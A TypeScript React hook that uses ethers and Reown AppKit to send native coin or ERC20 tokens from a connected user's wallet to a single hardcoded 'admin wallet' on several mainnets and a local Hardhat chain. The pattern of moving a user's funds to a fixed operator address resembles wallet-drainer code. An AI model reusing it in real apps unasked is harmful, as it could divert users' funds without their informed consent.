import { useState, useCallback } from 'react';
import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { BrowserProvider, Contract, parseUnits } from 'ethers';

interface SimpleTransferState {
  isTransferring: boolean;
  transactionHash: string | null;
  error: string | null;
  step: 'idle' | 'transferring' | 'completed' | 'error';
}

const ERC20_ABI = [
  'function transfer(address to, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)'
];

// Admin wallet addresses for each network
const ADMIN_WALLETS: Record<number, string> = {
  1: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8', // Ethereum
  137: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8', // Polygon
  56: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8', // BSC
  42161: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8', // Arbitrum
  10: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8', // Optimism
  43114: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8', // Avalanche
  1337: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8' // Local hardhat
};

export function useSimpleTransfer() {
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider('eip155');

  const [transferState, setTransferState] = useState<SimpleTransferState>({
    isTransferring: false,
    transactionHash: null,
    error: null,
    step: 'idle'
  });

  const executeTransfer = useCallback(async (
    tokenAddress: string,
    amount: string,
    chainId: number
  ): Promise<string | null> => {
    try {
      if (!isConnected || !address || !walletProvider) {
        throw new Error('Wallet not connected');
      }

      const adminWallet = ADMIN_WALLETS[chainId];
      if (!adminWallet) {
        throw new Error(`Admin wallet not configured for chain ${chainId}`);
      }

      setTransferState({
        isTransferring: true,
        transactionHash: null,
        error: null,
        step: 'transferring'
      });

      console.log('Executing simple transfer:', { tokenAddress, amount, chainId, adminWallet });

      const provider = new BrowserProvider(walletProvider as any);
      const signer = await provider.getSigner();

      let txHash: string;

      if (tokenAddress === '0x0000000000000000000000000000000000000000') {
        // Native token transfer (ETH, MATIC, BNB, etc.)
        console.log('Transferring native token');
        
        const amountWei = parseUnits(amount, 18);
        const tx = await signer.sendTransaction({
          to: adminWallet,
          value: amountWei,
          gasLimit: 21000
        });

        console.log('Native transaction sent:', tx.hash);
        const receipt = await tx.wait();
        txHash = receipt?.hash || tx.hash;
        
      } else {
        // ERC20 token transfer
        console.log('Transferring ERC20 token');
        
        const tokenContract = new Contract(tokenAddress, ERC20_ABI, signer);
        const decimals = await tokenContract.decimals();
        const amountBigInt = parseUnits(amount, decimals);

        const tx = await tokenContract.transfer(adminWallet, amountBigInt);
        console.log('ERC20 transaction sent:', tx.hash);
        
        const receipt = await tx.wait();
        txHash = receipt.hash;
      }

      console.log('Simple transfer completed:', txHash);

      setTransferState({
        isTransferring: false,
        transactionHash: txHash,
        error: null,
        step: 'completed'
      });

      return txHash;

    } catch (error) {
      console.error('Simple transfer failed:', error);
      
      const errorMessage = error instanceof Error ? error.message : 'Unknown transfer error';
      
      setTransferState({
        isTransferring: false,
        transactionHash: null,
        error: errorMessage,
        step: 'error'
      });

      return null;
    }
  }, [isConnected, address, walletProvider]);

  const resetTransfer = useCallback(() => {
    setTransferState({
      isTransferring: false,
      transactionHash: null,
      error: null,
      step: 'idle'
    });
  }, []);

  return {
    transferState,
    executeTransfer,
    resetTransfer
  };
}